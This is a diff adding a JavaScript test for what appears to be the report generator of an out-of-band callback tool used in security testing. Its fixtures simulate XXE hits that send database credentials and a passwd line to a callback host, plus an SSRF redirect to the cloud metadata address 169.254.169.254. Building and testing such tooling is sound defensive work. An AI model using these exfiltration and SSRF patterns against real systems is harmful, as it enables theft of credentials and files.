@@ -283,3 +283,25 @@ test("store: reach is per client, without self-tests or decoys; sources marked a
   assert.deepEqual(v.clients.map((c) => [c.ip, c.maxHop]).sort(), [["203.0.113.1", 1], ["203.0.113.2", 3]]);
   assert.deepEqual(s.mine(), ["198.51.100.7"]);
 });
+
+test("report: what the edge served, the XXE file data, payloads that fired, query values with '='", () => {
+  const at = (s) => `2026-11-05T11:00:${String(s).padStart(2, "0")}.000Z`;
+  const web = (id, s, fullId, line, answer) => ({ id, protocol: "http", uniqueId: ID, fullId, remoteAddress: "203.0.113.9", timestamp: at(s), tag: "x1",
+    rawRequest: `${line}\r\nHost: ${fullId}.${D}\r\nUser-Agent: Java/1.8\r\n\r\n`, rawResponse: "HTTP/1.1 200 OK\r\n\r\n", reqSha256: "a", answer });
+  const hits = [
+    web(1, 1, `kx1.x1.${ID}`, "GET /x.dtd HTTP/1.1", { by: "colluder", mode: "preset", version: 1, part: "x.dtd", tag: "x1" }),
+    web(2, 2, `kx0.x1.${ID}`, "GET /d?d=DB_USER=app&DB_PASS=s3cret HTTP/1.1", { by: "colluder", mode: "preset", version: 1, tag: "x1" }),
+    web(3, 3, `kx0.x1.${ID}`, "GET /d?d= HTTP/1.1", { by: "colluder", mode: "preset", version: 1, tag: "x1" }),
+    web(4, 4, `x1.${ID}`, "GET /?hop=3 HTTP/1.1", { by: "colluder", mode: "redirect", version: 2, hop: 3, code: 302, to: "169.254.169.254", tag: "x1" }),
+    web(5, 5, `x1.${ID}`, "GET /?t=cm9vdDp4OjA6MA== HTTP/1.1", { by: "colluder", mode: "default", version: null, tag: "x1" }),
+  ];
+  const md = probeReport({ probe: { tag: "x1", plantedAt: at(0), target: "", note: "" }, hits, enrich: () => null, domain: D, payloadId: ID, now: at(9) });
+  assert.match(md, /Payloads that fired:\*\* XXE, DOCTYPE line \(kx1\); XXE, File data from the DTD \(kx0\)/);
+  assert.match(md, /## What the edge served/);
+  assert.match(md, /`2026-11-05 11:00:01\.000` served x\.dtd, to `203\.0\.113\.9`/);
+  assert.match(md, /followed 2 redirects · answered 302 → 169\.254\.169\.254/);
+  assert.match(md, /## File data read through XXE/);
+  assert.match(md, /```\nDB_USER=app&DB_PASS=s3cret\n```/, "everything after the first d=");
+  assert.match(md, /empty \(the DTD ran; the read returned nothing\)/);
+  assert.match(md, /`cm9vdDp4OjA6MA==` decodes as base64url to `root:x:0:0`/, "padding kept");
+});
